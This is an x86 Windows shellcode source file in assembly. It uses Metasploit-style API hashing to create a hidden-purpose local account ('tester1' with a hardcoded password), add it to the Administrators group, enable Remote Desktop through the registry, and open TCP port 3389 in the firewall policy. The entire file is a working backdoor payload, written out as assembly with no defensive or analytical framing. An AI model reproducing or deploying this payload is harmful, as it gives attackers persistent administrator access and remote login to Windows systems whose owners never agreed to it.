; Purpose: Use Win32 API to 
;  - create a new user and add to local administrators group
;  - Enable RDP
;  - Exit  
;
; Uses Stephen Fewer's Block API hashing 
;  https://raw.githubusercontent.com/rapid7/metasploit-framework/master/external/source/shellcode/windows/x86/src/block/block_api.asm

[BITS 32]

  cld
  call start


; Input: The hash of the API to call and all its parameters must be pushed onto stack.
; Output: The return value from the API call will be in EAX.
; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)
; Un-Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un-clobbered.
; Note: This function assumes the direction flag has allready been cleared via a CLD instruction.
; Note: This function is unable to call forwarded exports.

api_call:
  pushad                     ; We preserve all the registers for the caller, bar EAX and ECX.
  mov ebp, esp               ; Create a new stack frame
  xor edx, edx               ; Zero EDX
  mov edx, [fs:edx+0x30]     ; Get a pointer to the PEB
  mov edx, [edx+0xc]         ; Get PEB->Ldr
  mov edx, [edx+0x14]        ; Get the first module from the InMemoryOrder module list

next_mod:                    ;
  mov esi, [edx+0x28]        ; Get pointer to modules name (unicode string)
  movzx ecx, word [edx+0x26] ; Set ECX to the length we want to check
  xor edi, edi               ; Clear EDI which will store the hash of the module name

loop_modname:                ;
  xor eax, eax               ; Clear EAX
  lodsb                      ; Read in the next byte of the name
  cmp al, 'a'                ; Some versions of Windows use lower case module names
  jl not_lowercase           ;
  sub al, 0x20               ; If so normalise to uppercase

not_lowercase:               ;
  ror edi, 0xd               ; Rotate right our hash value
  add edi, eax               ; Add the next byte of the name
  dec ecx
  jnz loop_modname           ; Loop until we have read enough
  ; We now have the module hash computed
  push edx                   ; Save the current position in the module list for later
  push edi                   ; Save the current module hash for later
  ; Proceed to iterate the export address table,
  mov edx, [edx+0x10]        ; Get this modules base address
  mov eax, [edx+0x3c]        ; Get PE header
  add eax, edx               ; Add the modules base address
  mov eax, [eax+0x78]        ; Get export tables RVA
  test eax, eax              ; Test if no export address table is present
  jz get_next_mod1           ; If no EAT present, process the next module
  add eax, edx               ; Add the modules base address
  push eax                   ; Save the current modules EAT
  mov ecx, [eax+0x18]        ; Get the number of function names
  mov ebx, [eax+0x20]        ; Get the rva of the function names
  add ebx, edx               ; Add the modules base address

; Computing the module hash + function hash
get_next_func:               ;
  test ecx, ecx              ; Changed from jecxz to accomodate the larger offset produced by random jmps below
  jz get_next_mod            ; When we reach the start of the EAT (we search backwards), process the next module
  dec ecx                    ; Decrement the function name counter
  mov esi, [ebx+ecx*4]       ; Get rva of next module name
  add esi, edx               ; Add the modules base address
  xor edi, edi               ; Clear EDI which will store the hash of the function name

; And compare it to the one we want
loop_funcname:               ;
  xor eax, eax               ; Clear EAX
  lodsb                      ; Read in the next byte of the ASCII function name
  ror edi, 0xd               ; Rotate right our hash value
  add edi, eax               ; Add the next byte of the name
  cmp al, ah                 ; Compare AL (the next byte from the name) to AH (null)
  jne loop_funcname          ; If we have not reached the null terminator, continue
  add edi, [ebp-8]           ; Add the current module hash to the function hash
  cmp edi, [ebp+0x24]        ; Compare the hash to the one we are searchnig for
  jnz get_next_func          ; Go compute the next function hash if we have not found it
  ; If found, fix up stack, call the function and then value else compute the next one...
  pop eax                    ; Restore the current modules EAT
  mov ebx, [eax+0x24]        ; Get the ordinal table rva
  add ebx, edx               ; Add the modules base address
  mov cx, [ebx+2*ecx]        ; Get the desired functions ordinal
  mov ebx, [eax+0x1c]        ; Get the function addresses table rva
  add ebx, edx               ; Add the modules base address
  mov eax, [ebx+4*ecx]       ; Get the desired functions RVA
  add eax, edx               ; Add the modules base address to get the functions actual VA

; We now fix up the stack and perform the call to the desired function...
finish:
  mov [esp+0x24], eax        ; Overwrite the old EAX value with the desired api address for the upcoming popad
  pop ebx                    ; Clear off the current modules hash
  pop ebx                    ; Clear off the current position in the module list
  popad                      ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
  pop ecx                    ; Pop off the origional return address our caller will have pushed
  pop edx                    ; Pop off the hash value our caller will have pushed
  push ecx                   ; Push back the correct return value
  jmp eax                    ; Jump into the required function

; We now automagically return to the correct caller...
get_next_mod:                ;
  pop eax                    ; Pop off the current (now the previous) modules EAT

get_next_mod1:               ;
  pop edi                    ; Pop off the current (now the previous) modules hash
  pop edx                    ; Restore our position in the module list
  mov edx, [edx]             ; Get the next module
  jmp next_mod               ; Process this module


; Begin Add User Code
start:
  pop ebp		     ; pop off the address of 'api_call' for calling later

; LoadLibrary(netapi32)
; https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
  xor ebx, ebx
  push ebx		     ; push null terminator
  push 0x32336970            ; netapi32 in reverse
  push 0x6174656E
  push esp                   ; push pointer to netapi32
  push 0x0726774C	     ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp

; pointer to username - UNICODE tester1
  push 0x00000031
  push 0x00720065
  push 0x00740073
  push 0x00650074
  mov ebx, esp		     ; ebx is unclobbered 

; pointer to password - UNICODE P@ssword123
  push 0x00000033
  push 0x00320031
  push 0x00640072
  push 0x006f0077
  push 0x00730073
  push 0x00400050
  mov eax, esp

; setup USER_INFO struct
; https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/ns-lmaccess-user_info_1
; https://www.pinvoke.net/default.aspx/netapi32/USER_INFO_1.html
  xor ecx, ecx
  push ecx			; usri1_script_path = Null
  inc ecx
  push ecx			; usri1_flags = UF_SCRIPT
  dec ecx
  push ecx			; usri1_comment = Null
  push ecx			; usri1_home_dir = Null
  inc ecx
  push ecx			; usri1_priv = USER_PRIV_USER
  dec ecx
  push ecx			; usri1_password_age = Null
  push eax			; pointer to password
  push ebx			; pointer to username
  mov edx, esp			; save pointer to USER_INFO struct

; Call NetUserAdd
; https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuseradd
; https://www.pinvoke.net/default.aspx/netapi32.netuseradd
  push ecx                        ; parm_err = Null
  push edx                        ; pointer to USER_INFO struct
  inc ecx
  push ecx                        ; level
  dec ecx
  push ecx                        ; servername = Null
  push 0x45A66918		  ; hash("netapi32.dll", "NetUserAdd")
  call ebp

; pointer to groupname - UNICODE administrators
  xor ecx, ecx
  push ecx
  push 0x00730072
  push 0x006f0074
  push 0x00610072
  push 0x00740073
  push 0x0069006e
  push 0x0069006d
  push 0x00640061
  mov ecx, esp

; setup LOCALGROUP_MEMBERS_INFO_3 struct
; https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/ns-lmaccess-localgroup_members_info_3
; https://www.pinvoke.net/default.aspx/Structures.LOCALGROUP_MEMBERS_INFO_3
  push ebx                         ; push pointer to username
  mov eax, esp                     ; pointer for LOCALGROUP_MEMBERS_INFO_3.lgrmi3_domainandname

; Call to NetLocalGroupAddMembers
; https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers
; https://www.pinvoke.net/default.aspx/netapi32.netlocalgroupaddmembers
  xor edx, edx                    ; clear ebx
  inc edx
  push edx                        ; totalentries = 1
  dec edx
  push eax                        ; buf = pointer to LOCALGROUP_MEMBERS_INFO_3 struct
  push 0x3                        ; level
  push ecx                        ; groupname = pointer to administrators
  push edx                        ; servername = Null
  push 0x396E1593		  ; hash("netapi32.dll", "NetLocalGroupAddMembers")
  call ebp

; Enable RDP

; LoadLibrary(netapi32)
; https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
  xor ebx, ebx
  push ebx                   ; push null terminator
  push 0x32336970	     ; advapi32 in reverse
  push 0x61766461
  push esp                   ; push pointer to advapi32
  push 0x0726774C            ; hash( "kernel32.dll", "LoadLibraryA" )
  call ebp

; for the handle
  xor edx, edx
  mov edi, esp		     ; edi is un-clobbered
  mov dword [edi], edx
  sub esp, 0x10       	     ; avoid handle being overwritten

; Prepare the key
; SYSTEM\CurrentControlSet\Control\Terminal Server
  xor edx, edx
  push edx
  push 0x72657672
  push 0x6553206c
  push 0x616e696d
  push 0x7265545c
  push 0x6c6f7274
  push 0x6e6f435c
  push 0x7465536c
  push 0x6f72746e
  push 0x6f43746e
  push 0x65727275
  push 0x435c4d45
  push 0x54535953
  mov edx, esp

; https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa
; https://www.pinvoke.net/default.aspx/advapi32/RegCreateKeyA.html
  xor eax, eax
  push eax              ; pDisposion = NULL
  push edi              ; pHandle
  push eax              ; pSecurity = NULL
  push 0x0f003f         ; Access = KEY_ALL_ACCESS
  push eax              ; Options = REG_OPTION_NON_VOLATILE
  push eax              ; Class = NULL
  push eax              ; Reserved = NULL
  push edx              ; Subkey
  push 0x80000002       ; hkey = HKEY_LOCAL_MACHINE
  push 0x18355858	; hash("advapi32.dll", "RegCreateKeyExA")
  call ebp

; RegSetValue ValueName = fDenyTSConnections
  push 0x0000736e
  push 0x6f697463
  push 0x656e6e6f
  push 0x43535479
  push 0x6e654466
  mov edx, esp

; RegSetValue buffer = 0
  xor ecx, ecx
  push ecx
  mov ecx, esp

; https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa
; https://www.pinvoke.net/default.aspx/advapi32.reggetvalue
  xor eax, eax
  push 0x4            	; cbData - size of DWORD
  push ecx            	; lpData - pointer to data (0)
  push 0x4            	; dwType - REG_DWORD
  push eax            	; Reserved - must by Null
  push edx            	; lpValueName (fDenyTSConnections)
  push dword [edi]    	; hKey
  push 0xB97A6615	; hash("advapi32.dll", "RegSetValueExA")
  call ebp

; Close handle to Key
  push dword [edi]     	; hKey
  push 0x81C2AC44	; hash("advapi32.dll", "RegCloseKey")
  call ebp

; Prepare the key
; SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\Firewallpolicy\StandardProfile\GloballyOpenPorts\List
  push 0x00747369
  push 0x4c5c7374
  push 0x726f506e
  push 0x65704f79
  push 0x6c6c6162
  push 0x6f6c475c
  push 0x656c6966
  push 0x6f725064
  push 0x7261646e
  push 0x6174535c
  push 0x7963696c
  push 0x6f706c6c
  push 0x61776572
  push 0x69465c73
  push 0x72657465
  push 0x6d617261
  push 0x505c7373
  push 0x65636341
  push 0x64657261
  push 0x68535c73
  push 0x65636976
  push 0x7265535c
  push 0x7465536c
  push 0x6f72746e
  push 0x6f43746e
  push 0x65727275
  push 0x435c4d45
  push 0x54535953
  mov edx, esp

; https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa
; https://www.pinvoke.net/default.aspx/advapi32/RegCreateKeyA.html
  xor eax, eax
  push eax              ; pDisposion = NULL
  push edi              ; pHandle
  push eax              ; pSecurity = NULL
  push 0x0f003f         ; Access = KEY_ALL_ACCESS
  push eax              ; Options = REG_OPTION_NON_VOLATILE
  push eax              ; Class = NULL
  push eax              ; Reserved = NULL
  push edx              ; Subkey
  push 0x80000002       ; hkey = HKEY_LOCAL_MACHINE
  push 0x18355858       ; hash("advapi32.dll", "RegCreateKeyExA")
  call ebp

; RegSetValue ValueName = 3389:TCP
  xor edx, edx
  push edx
  push 0x5043543a
  push 0x39383333
  mov edx, esp

; RegSetValue buffer = 3389:TCP:*:Enabled:RDP
  xor ecx, ecx
  push ecx
  push 0x00205044
  push 0x523a6465
  push 0x6c62616e
  push 0x453a2a3a
  push 0x5043543a
  push 0x39383333
  mov ecx, esp

; https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa
; https://www.pinvoke.net/default.aspx/advapi32.reggetvalue
  xor eax, eax
  inc eax
  push 0x18           ;BufSize = 0x16
  push ecx            ;Buffer
  push eax            ;ValueType = REG-SZ
  dec eax
  push eax            ;Reserved = 0
  push edx            ;ValueName
  push dword [edi]    ;hKey
  push 0xB97A6615       ; hash("advapi32.dll", "RegSetValueExA")
  call ebp

; Close handle to Key
  push dword [edi]      ; hKey
  push 0x81C2AC44       ; hash("advapi32.dll", "RegCloseKey")
  call ebp

; Exit Process
  xor eax, eax
  push eax
  push 0x56A2B5F0      ; hash("kernel32.dll", "ExitProcess") 
  call ebp
